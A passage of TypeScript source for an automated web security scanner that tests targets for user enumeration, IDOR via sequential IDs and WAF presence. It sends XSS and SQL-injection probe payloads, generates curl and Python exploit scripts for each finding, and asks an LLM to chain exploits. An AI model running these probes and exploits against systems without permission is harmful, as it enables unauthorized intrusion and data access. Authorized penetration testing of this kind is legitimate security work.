        if (b1 !== b2 && ['not found', 'invalid user', "doesn't exist"].some(k => b2.includes(k))) {
          findings.push({
            id: `A07-ENUM-${Date.now()}`, severity: 'medium',
            title: 'User Enumeration', owasp: 'A07:2021',
            description: 'Different errors for valid vs invalid users.',
            endpoint, method: 'POST', evidence: 'Different responses', evidence2: 'Username-specific',
            dualConfirmed: true, remediation: 'Generic errors.',
            cwe: 'CWE-204', confidence: 82, category: 'auth'
          });
        }
      }
    } catch {}
  }
  return findings;
}

async function testBusinessLogic(target: URL, workflows: string[]): Promise<Finding[]> {
  const findings: Finding[] = [];
  const idorPaths = ['/user/', '/profile/', '/account/', '/order/', '/invoice/', '/document/', '/api/user/', '/api/account/'];
  for (const path of idorPaths) {
    try {
      const [r1, r2] = await Promise.all([
        fetchWithTimeout(new URL(`${path}1`, target).toString(), 4000).catch(() => null),
        fetchWithTimeout(new URL(`${path}2`, target).toString(), 4000).catch(() => null)
      ]);
      if (r1?.status === 200 && r2?.status === 200) {
        const b1 = await r1.text();
        const b2 = await r2.text();
        if (b1 !== b2 && b1.length > 100) {
          findings.push({
            id: `A01-IDOR-${Date.now()}`, severity: 'high',
            title: `IDOR at ${path}`, owasp: 'A01:2021',
            description: 'Sequential IDs leak different data.',
            endpoint: new URL(`${path}1`, target).toString(), method: 'GET',
            evidence: 'Different responses for /1 and /2', evidence2: 'IDOR confirmed',
            dualConfirmed: true, exploitValidated: true,
            remediation: 'Auth checks + UUIDs.',
            cwe: 'CWE-639', cvss: 7.5, mitre: ['T1078'], confidence: 80, category: 'access_control'
          });
        }
      }
    } catch {}
  }
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// POC GENERATION (Bug Bounty Grade with actual request/response)
// ═══════════════════════════════════════════════════════════════════════════════
async function generateAIExploitPOC(findings: Finding[], fingerprint: any, apiKey: string | undefined): Promise<Finding[]> {
  for (const finding of findings) {
    const ep = finding.endpoint;
    const pl = finding.payload || '';
    const method = (finding.method || 'GET').toUpperCase();

    // Generate detailed POC with reproduction steps
    finding.poc = `# ═══════════════════════════════════════════════════
# OmniSec™ v11 — Bug Bounty POC Report
# ═══════════════════════════════════════════════════
# Title: ${finding.title}
# Severity: ${finding.severity.toUpperCase()} | CVSS: ${finding.cvss || 'N/A'}
# CWE: ${finding.cwe || 'N/A'} | OWASP: ${finding.owasp || 'N/A'}
# Confidence: ${finding.confidence}%
# Exploit-Validated: ${finding.exploitValidated ? 'YES ✓' : 'NO'}
# Dual-Confirmed: ${finding.dualConfirmed ? 'YES ✓' : 'NO'}

## Description
${finding.description}

## Steps to Reproduce

### Step 1: Send the initial request
\`\`\`bash
curl -v -X ${method} "${ep}"${pl ? ` \\\n  -d "${pl}"` : ''}
\`\`\`

### Step 2: Observe the vulnerability indicator
${finding.evidence || 'Check response for vulnerability indicators'}

### Step 3: Confirm with second probe
${finding.evidence2 || 'Run a second test variation to confirm'}

## Evidence
- Primary: ${finding.evidence || 'N/A'}
- Secondary: ${finding.evidence2 || 'N/A'}

## Impact
${finding.severity === 'critical' ? 'CRITICAL: Full system compromise possible. Unauthorized data access, RCE, or complete authentication bypass.' :
  finding.severity === 'high' ? 'HIGH: Significant security impact. Data theft, session hijacking, or privilege escalation.' :
  'MEDIUM: Security weakness that should be remediated to prevent exploitation.'}

## Remediation
${finding.remediation}

## References
- CWE: https://cwe.mitre.org/data/definitions/${(finding.cwe || '').replace('CWE-', '')}.html
- OWASP: https://owasp.org/Top10/
${finding.mitre ? `- MITRE: ${finding.mitre.map(m => `https://attack.mitre.org/techniques/${m}/`).join('\n- MITRE: ')}` : ''}`;

    // Python exploit
    finding.exploitCode = `#!/usr/bin/env python3
"""
OmniSec™ v11 Legend-Grade Exploit
${finding.title}
${finding.owasp || ''} | CWE: ${finding.cwe || 'N/A'} | CVSS: ${finding.cvss || 'N/A'}
Confidence: ${finding.confidence}% | Exploit-Validated: ${finding.exploitValidated ? 'YES' : 'NO'}
"""
import requests, sys, urllib3, time
urllib3.disable_warnings()

TARGET = "${finding.endpoint}"
PAYLOAD = ${JSON.stringify(finding.payload || '')}

def exploit():
    print(f"[*] OmniSec v11 - Testing: {TARGET}")
    print(f"[*] Vulnerability: ${finding.title}")
    print(f"[*] CWE: ${finding.cwe || 'N/A'} | CVSS: ${finding.cvss || 'N/A'}")
    print()
    
    try:
        # Step 1: Send exploit request
        print("[1] Sending exploit request...")
        r = requests.${(finding.method || 'get').toLowerCase()}(
            TARGET,
            headers={"User-Agent": "OmniSec/11.0"},
            timeout=15, verify=False
        )
        print(f"    Status: {r.status_code} | Length: {len(r.text)}")
        
        # Step 2: Analyze response
        print("[2] Analyzing response...")
        ${finding.cwe === 'CWE-89' ? `
        sql_indicators = ['sql syntax','mysql_fetch','pg_query','ora-','you have an error','sqlstate']
        for indicator in sql_indicators:
            if indicator in r.text.lower():
                print(f"    [!] VULNERABLE: SQL error '{indicator}' found!")
                print(f"    [!] Response excerpt: {r.text[:300]}")
                return True
        ` : ''}${finding.cwe === 'CWE-79' ? `
        if PAYLOAD in r.text:
            print(f"    [!] VULNERABLE: Payload reflected unescaped!")
            idx = r.text.find(PAYLOAD)
            print(f"    [!] Context: ...{r.text[max(0,idx-50):idx+len(PAYLOAD)+50]}...")
            return True
        ` : ''}
        print(f"    Response: {r.text[:200]}")
        return r.status_code < 500
    except Exception as e:
        print(f"    [-] Error: {e}")
        return False

if __name__ == "__main__":
    result = exploit()
    print(f"\\n{'='*50}")
    print(f"Result: {'VULNERABLE ✓' if result else 'NOT CONFIRMED'}")
    sys.exit(0 if result else 1)`;
  }

  // AI-enhanced POC
  if (apiKey && findings.length > 0) {
    try {
      const topFindings = findings.slice(0, 3);
      const resp = await fetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
        method: "POST",
        headers: { Authorization: `Bearer ${apiKey}`, "Content-Type": "application/json" },
        body: JSON.stringify({
          model: "google/gemini-2.5-flash",
          messages: [
            { role: "system", content: "Bug bounty expert writing HackerOne-grade POC reports. Include: impact assessment, step-by-step reproduction with exact commands, business risk, and remediation. Return JSON." },
            { role: "user", content: `Findings:\n${JSON.stringify(topFindings.map(f => ({ id: f.id, title: f.title, endpoint: f.endpoint, payload: f.payload, cwe: f.cwe, evidence: f.evidence })))}\n\nReturn: {"pocs":[{"id":"...","impact":"...","steps":["..."],"business_risk":"...","bounty_estimate":"..."}]}` }
          ],
          temperature: 0.2
        }),
      });
      if (resp.ok) {
        const data = await resp.json();
        const content = data.choices?.[0]?.message?.content || '';
        const jsonMatch = content.match(/\{[\s\S]*\}/);
        if (jsonMatch) {
          const result = JSON.parse(jsonMatch[0]);
          for (const poc of (result.pocs || [])) {
            const finding = topFindings.find(f => f.id === poc.id);
            if (finding && poc.steps) {
              finding.poc += `\n\n# ═══ AI Bug Bounty Analysis ═══\n# Impact: ${poc.impact || 'N/A'}\n# Business Risk: ${poc.business_risk || 'N/A'}\n# Est. Bounty: ${poc.bounty_estimate || 'N/A'}\n${(poc.steps || []).map((s: string, i: number) => `# Step ${i + 1}: ${s}`).join('\n')}`;
            }
          }
        }
      }
    } catch {}
  }

  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// LEARNING + CORRELATION
// ═══════════════════════════════════════════════════════════════════════════════
async function fingerprintTarget(target: URL, discovery: any): Promise<any> {
  return {
    hostname: target.hostname, protocol: target.protocol,
    technologies: discovery.technologies || [], server: discovery.serverInfo,
    headers: discovery.headers, hasAuth: (discovery.authEndpoints?.length || 0) > 0,
    hasAPI: (discovery.apiEndpoints?.length || 0) > 0,
    formCount: discovery.forms?.length || 0, paramCount: discovery.params?.length || 0,
    shodanVulns: discovery.shodanData?.vulns || [], ports: discovery.ports || [],
  };
}

async function getFailedPayloads(supabase: any, hostname: string): Promise<string[]> {
  try {
    const { data } = await supabase.from('vapt_test_actions')
      .select('payload_sent').eq('domain', hostname).eq('outcome_label', 'blocked').limit(50);
    return data?.map((d: any) => d.payload_sent).filter(Boolean) || [];
  } catch { return []; }
}

async function loadPastSuccessfulAttacks(supabase: any, hostname: string, userId: string): Promise<any[]> {
  try {
    const { data } = await supabase.from('vapt_test_actions')
      .select('payload_sent, test_type, injection_point, target_url')
      .eq('outcome_label', 'success')
      .eq('operator_id', userId)
      .order('created_at', { ascending: false })
      .limit(30);
    return data || [];
  } catch { return []; }
}

async function saveLearningData(supabase: any, hostname: string, findings: Finding[], userId: string): Promise<void> {
  const learnable = findings.filter(f => !f.falsePositive && f.confidence >= 75);
  for (const finding of learnable.slice(0, 50)) {
    try {
      await supabase.from('vapt_test_actions').insert({
        target_url: finding.endpoint.slice(0, 500), domain: hostname,
        method: finding.method || 'GET',
        injection_point: finding.payload ? 'parameter' : null,
        test_type: (finding.id.split('-')[0] || 'vuln').toLowerCase(),
        payload_sent: finding.payload?.slice(0, 500) || null,
        transformed_payload: finding.exploitCode?.slice(0, 500) || null,
        outcome_label: finding.exploitValidated ? 'success' : finding.dualConfirmed ? 'partial' : 'no_effect',
        operator_id: userId,
        notes: `[${finding.confidence}% | ${finding.owasp || 'N/A'} | ${finding.exploitValidated ? 'XBOW' : finding.dualConfirmed ? 'DUAL' : 'SINGLE'}] ${finding.title}`.slice(0, 500),
        embedding_text: `${finding.title} ${finding.description} ${finding.cwe || ''} ${finding.owasp || ''}`.slice(0, 1000),
      });
    } catch {}
  }
}

async function performAICorrelation(findings: Finding[], discovery: any, fingerprint: any, apiKey: string | undefined): Promise<any> {
  if (!apiKey || findings.length === 0) {
    return {
      attackPaths: findings.filter(f => f.severity === 'critical').map(f => ({ name: f.title, steps: [f.description], impact: 'Critical' })),
      chainedExploits: [], recommendations: ['Remediate critical findings', 'Implement security headers', 'Enable WAF']
    };
  }
  try {
    const resp = await fetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
      method: "POST",
      headers: { Authorization: `Bearer ${apiKey}`, "Content-Type": "application/json" },
      body: JSON.stringify({
        model: "google/gemini-2.5-flash",
        messages: [
          { role: "system", content: "Senior pentester. Analyze findings, create exploit chains. Return valid JSON only." },
          { role: "user", content: `Target: ${fingerprint.hostname}\nTech: ${(fingerprint.technologies || []).join(', ')}\nFindings: ${JSON.stringify(findings.filter(f => f.exploitValidated || f.dualConfirmed).slice(0, 15))}\n\nReturn: {"attackPaths":[{"name":"...","steps":["..."],"impact":"..."}],"chainedExploits":[{"vulnerabilities":["..."],"exploitation":"...","impact":"..."}],"recommendations":["..."]}` }
        ],
        temperature: 0.2
      }),
    });
    if (resp.ok) {
      const data = await resp.json();
      const content = data.choices?.[0]?.message?.content || '';
      const jsonMatch = content.match(/\{[\s\S]*\}/);
      if (jsonMatch) return JSON.parse(jsonMatch[0]);
    }
  } catch {}
  return {
    attackPaths: findings.filter(f => f.severity === 'critical').map(f => ({ name: f.title, steps: [f.description], impact: 'Critical' })),
    chainedExploits: [], recommendations: ['Remediate critical vulnerabilities']
  };
}

// ═══════════════════════════════════════════════════════════════════════════════
// WAF FINGERPRINTING (WafW00f-style)
// ═══════════════════════════════════════════════════════════════════════════════
const WAF_SIGNATURES: Record<string, { headers?: string[]; body?: string[]; cookies?: string[]; status?: number[] }> = {
  'Cloudflare': { headers: ['cf-ray', 'cf-cache-status', '__cfduid', 'cf-request-id'], body: ['Attention Required! | Cloudflare', 'cloudflare-nginx', 'cf-error-details'], cookies: ['__cfruid', '__cfuid'] },
  'AWS WAF': { headers: ['x-amzn-requestid', 'x-amz-cf-id'], body: ['<TITLE>ERROR: The request could not be satisfied</TITLE>', 'Request blocked', 'Generated by cloudfront'] },
  'Akamai': { headers: ['x-akamai-transformed', 'akamai-grn', 'x-check-cacheable'], body: ['Access Denied', 'AkamaiGHost'], cookies: ['akamai'] },
  'Imperva/Incapsula': { headers: ['x-iinfo', 'x-cdn'], body: ['Incapsula incident ID', 'Request unsuccessful', '_Incapsula_Resource'], cookies: ['incap_ses', 'visid_incap'] },
  'ModSecurity': { body: ['ModSecurity', 'This error was generated by Mod_Security', 'Not Acceptable', 'mod_security'], status: [406] },
  'F5 BIG-IP ASM': { headers: ['x-wa-info'], cookies: ['TS0', 'BIGipServer', 'f5_cspm'], body: ['The requested URL was rejected'] },
  'Sucuri': { headers: ['x-sucuri-id', 'x-sucuri-cache', 'server: Sucuri'], body: ['Sucuri WebSite Firewall', 'Access Denied - Sucuri'], cookies: ['sucuri_cloudproxy'] },
  'Barracuda': { headers: ['barra_counter_session'], cookies: ['barra_counter_session'], body: ['Barracuda Web Application Firewall'] },
  'Fortinet FortiWeb': { cookies: ['FORTIWAFSID'], body: ['FortiGuard Intrusion Prevention', '.fgd_icon'] },
  'Wordfence': { body: ['This response was generated by Wordfence', 'wordfence-ls'], cookies: ['wfvt_'] },
  'DenyAll': { headers: ['sessioncookie'], body: ['Condition Intercepted'] },
  'StackPath': { headers: ['x-sp-url', 'x-sp-waf-request-id'], body: ['StackPath'] },
  'Fastly': { headers: ['x-fastly-request-id', 'fastly-restarts'], body: ['Fastly error:'] },
  'Reblaze': { headers: ['rbzid'], cookies: ['rbzid'], body: ['Access Denied (403)'] },
  'Wallarm': { headers: ['wallarm-waf-blocked'] },
};

async function detectWAF(target: URL): Promise<{ detected: boolean; name: string; confidence: number; evidence: string[] }> {
  const result = { detected: false, name: '', confidence: 0, evidence: [] as string[] };
  
  // Test 1: Normal request headers/cookies
  try {
    const normalResp = await fetchWithTimeout(target.toString(), 8000);
    const headers = Object.fromEntries(normalResp.headers.entries());
    const headerStr = JSON.stringify(headers).toLowerCase();
    const body = await normalResp.text().catch(() => '');
    const cookieHeader = normalResp.headers.get('set-cookie') || '';
    
    for (const [waf, sig] of Object.entries(WAF_SIGNATURES)) {
      let score = 0;
      const ev: string[] = [];
      
      if (sig.headers) {
        for (const h of sig.headers) {
          if (headerStr.includes(h.toLowerCase())) { score += 30; ev.push(`Header: ${h}`); }
        }
      }
      if (sig.cookies) {
        for (const c of sig.cookies) {
          if (cookieHeader.toLowerCase().includes(c.toLowerCase())) { score += 25; ev.push(`Cookie: ${c}`); }
        }
      }
      if (sig.body) {
        for (const b of sig.body) {
          if (body.includes(b)) { score += 20; ev.push(`Body: "${b.slice(0, 40)}"`); }
        }
      }
      
      if (score > result.confidence) {
        result.detected = score >= 25;
        result.name = waf;
        result.confidence = Math.min(score, 100);
        result.evidence = ev;
      }
    }
  } catch {}
  
  // Test 2: Trigger WAF with malicious payload
  if (!result.detected || result.confidence < 60) {
    try {
      const triggerUrl = `${target.toString()}?test=<script>alert(1)</script>&id=1' OR 1=1--`;
      const triggerResp = await fetchWithTimeout(triggerUrl, 8000);
      const triggerBody = await triggerResp.text().catch(() => '');
      const triggerHeaders = Object.fromEntries(triggerResp.headers.entries());
      
      if (triggerResp.status === 403 || triggerResp.status === 406 || triggerResp.status === 429) {
        result.evidence.push(`Blocked: HTTP ${triggerResp.status} on malicious payload`);
        
        for (const [waf, sig] of Object.entries(WAF_SIGNATURES)) {
          if (sig.body?.some(b => triggerBody.includes(b))) {
            result.detected = true;
            result.name = waf;
            result.confidence = Math.max(result.confidence, 85);
            result.evidence.push(`Trigger body matched: ${waf}`);
            break;
          }
          if (sig.status?.includes(triggerResp.status)) {
            result.detected = true;
            result.name = result.name || waf;
            result.confidence = Math.max(result.confidence, 60);
          }
        }
        
        if (!result.name && (triggerResp.status === 403 || triggerResp.status === 406)) {
          result.detected = true;
          result.name = 'Unknown WAF';
          result.confidence = Math.max(result.confidence, 50);
          result.evidence.push('Generic block response on XSS/SQLi probe');
        }
      }
    } catch {}
  }
  
  return result;
}


// ═══════════════════════════════════════════════════════════════════════════════
async function fetchWithTimeout(url: string, timeout: number, options?: RequestInit): Promise<Response> {
  const controller = new AbortController();
  const tid = setTimeout(() => controller.abort(), timeout);
  try {
    const response = await fetch(url, {
      ...options, signal: controller.signal,
      headers: { "User-Agent": "OmniSec XBOW VAPT/11.0", ...(options?.headers || {}) }
    });
    clearTimeout(tid);
    return response;
  } catch (e) {
    clearTimeout(tid);
    throw e;
  }
}
